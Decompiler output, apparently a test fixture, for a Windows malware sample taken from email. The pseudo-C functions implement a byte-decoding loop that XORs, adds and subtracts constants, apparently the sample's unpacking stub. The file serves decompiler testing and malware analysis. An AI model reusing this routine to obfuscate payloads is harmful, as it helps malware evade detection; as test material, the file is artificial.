// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0032/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000()
{
	word32 ecx_15;
	word32 ebp_16;
	byte dh_17;
	word32 eax_18 = fn00401078(out ecx_15, out ebp_16, out dh_17);
	Mem24[fp - 0x00000018:word32] = Mem0[0x00404400:word32];
	Mem26[fp - 0x0000001C:word32] = 0x00402000;
	fn00401128(eax_18, ecx_15, ebp_16, dh_17);
	Mem33[fp - 0x00000018:word32] = 0x0000062E;
	Mem35[fp - 0x0000001C:word32] = 0x00401128;
	word32 ecx_36;
	word32 ebp_37;
	byte dh_38;
	fn00401078(out ecx_36, out ebp_37, out dh_38);
	if (false)
	{
		Mem51[fp - 0x00000018:word32] = 0x00405000;
		Mem53[fp - 0x0000001C:word32] = 0x00401000;
		lstrcpyA(Mem53[fp - 0x0000001C:LPSTR], Mem53[fp - 24:LPCSTR]);
	}
	return;
}

word32 fn00401078(ptr32 ecxOut, ptr32 ebpOut, ptr32 dhOut)
{
	word32 ecx_9;
	word32 ebp_10;
	byte dh_11;
	return fn00401085(fp - 0x00000004, out ecx_9, out ebp_10, out dh_11);
}

word32 fn00401085(word32 ebp, ptr32 ecxOut, ptr32 ebpOut, ptr32 dhOut)
{
	eax = Mem0[ebp - 0x00000004:word32];
	edx_eax = SEQ(edx, eax);
	al = (byte) eax;
	SCZO = cond(eax - Mem0[ebp + 0x0000000C:word32]);
	SO = SCZO;
	if (Test(LT,SO))
	{
		SCZO = cond(Mem0[ebp - 0x00000004:word32] - 0x00000000);
		SZO = SCZO;
		if (Test(GT,SZO))
		{
			eax = Mem0[ebp - 0x00000004:word32];
			eax = eax & 0x00000001;
			SZO = cond(eax & eax);
			Z = SZO;
			C = false;
			if (Test(EQ,Z))
			{
				eax = Mem0[ebp - 0x00000004:word32];
				ecx = Mem0[ebp + 0x00000008:word32];
				ecx = ecx + eax;
				eax = Mem0[ebp - 0x00000004:word32];
				edx = Mem0[ebp + 0x00000008:word32];
				edx = edx + eax;
				al = 0xF3;
				al = 0xF3 ^ Mem0[edx + 0x00000000:byte];
				SZO = cond(al);
				C = false;
				Mem0[ecx + 0x00000000:byte] = al;
			}
		}
		SCZO = cond(Mem0[ebp - 0x00000004:word32] - 0x00000002);
		SZO = SCZO;
		if (Test(GT,SZO))
		{
			edx = Mem0[ebp - 0x00000004:word32];
			edx = edx - 0x00000002;
			eax = 0x00000003;
			ecx = 0x00000003;
			eax = edx;
			edx = edx >> 0x0000001F;
			edx_eax = SEQ(edx, eax);
			edx = edx_eax % 0x00000003;
			edx_eax = SEQ(edx, eax);
			eax = edx_eax / 0x00000003;
			SZO = cond(edx & edx);
			Z = SZO;
			C = false;
			if (Test(EQ,Z))
			{
				eax = Mem0[ebp - 0x00000004:word32];
				edx = Mem0[ebp + 0x00000008:word32];
				edx = edx + eax;
				eax = Mem0[ebp - 0x00000004:word32];
				eax = eax + Mem0[ebp + 0x00000008:word32];
				al = Mem0[eax + 0x00000000:byte];
				eax = DPB(eax, al, 0, 8);
				eax = eax + 0x00000058;
				al = (byte) eax;
				SCZO = cond(eax);
				Mem0[edx + 0x00000000:byte] = al;
			}
		}
		SCZO = cond(Mem0[ebp - 0x00000004:word32] - 0x00000003);
		SZO = SCZO;
		if (Test(GT,SZO))
		{
			eax = Mem0[ebp - 0x00000004:word32];
			edx = Mem0[ebp + 0x00000008:word32];
			edx = edx + eax;
			eax = Mem0[ebp - 0x00000004:word32];
			eax = eax + Mem0[ebp + 0x00000008:word32];
			al = Mem0[eax + 0x00000000:byte];
			eax = DPB(eax, al, 0, 8);
			eax = eax - 0x00000022;
			al = (byte) eax;
			SCZO = cond(eax);
			Mem0[edx + 0x00000000:byte] = al;
		}
		eax = Mem0[ebp - 0x00000004:word32];
		ecx = Mem0[ebp + 0x00000008:word32];
		ecx = ecx + eax;
		eax = Mem0[ebp - 0x00000004:word32];
		eax = eax + Mem0[ebp + 0x00000008:word32];
		edx_eax = SEQ(edx, eax);
		al = (byte) eax;
		SCZO = cond(eax);
		eax = fn00401113(eax, ecx, ebp, out ecx, out ebp, out dh);
		edx_eax = SEQ(edx, eax);
		al = (byte) eax;
		return eax;
	}
	else
	{
		esp = ebp;
		ebp = Mem0[esp + 0x00000000:word32];
		esp = esp + 0x00000004;
		return eax;
	}
}

word32 fn00401113(word32 eax, word32 ecx, word32 ebp, ptr32 ecxOut, ptr32 ebpOut, ptr32 dhOut)
{
	esp = fp;
	edx = Mem0[ebp - 0x00000004:word32];
	dl = (byte) edx;
	eax = fn00401115(eax, ecx, ebp, dl, out ecx, out ebp, out dh);
	al = (byte) eax;
	return eax;
}

word32 fn00401115(word32 eax, word32 ecx, word32 ebp, byte dl, ptr32 ecxOut, ptr32 ebpOut, ptr32 dhOut)
{
	esp = fp;
	D = false;
	al = Mem0[eax + 0x00000000:byte];
	al = al - dl;
	SCZO = cond(al);
	Mem0[ecx + 0x00000000:byte] = al;
	eax = ebp - 0x00000004;
	v10 = Mem0[eax + 0x00000000:word32] + 0x00000001;
	Mem0[eax + 0x00000000:word32] = v10;
	SZO = cond(v10);
	eax = fn00401085(ebp, out ecx, out ebp, out dh);
	al = (byte) eax;
	return eax;
}

void fn00401128(word32 eax, word32 ecx, word32 ebp, byte dh)
{
fn00401128_entry:
l00401128:
	byte dl_7 = (fp - 0x00000004)[eax * 0x04]
	branch Z && ecx != 0x00000001 l00401185
l0040112E:
l00401185:
	branch SO l00401185_thunk_fn00401113
	goto l00401187
l00401185_thunk_fn00401113:
	word32 ecx_25
	word32 ebp_26
	byte dh_27
	fn00401113(eax, ecx - 0x00000001, ebp, out ecx_25, out ebp_26, out dh_27)
	return
l00401187:
	Mem19[ecx + 0x00000005:byte] = Mem0[ecx + 0x00000005:byte] - dh
l0040118A_thunk_fn00401115:
	word32 ecx_21
	word32 ebp_22
	byte dh_23
	fn00401115(eax, ecx - 0x00000001, ebp, dl_7, out ecx_21, out ebp_22, out dh_23)
	return
fn00401128_exit:
}

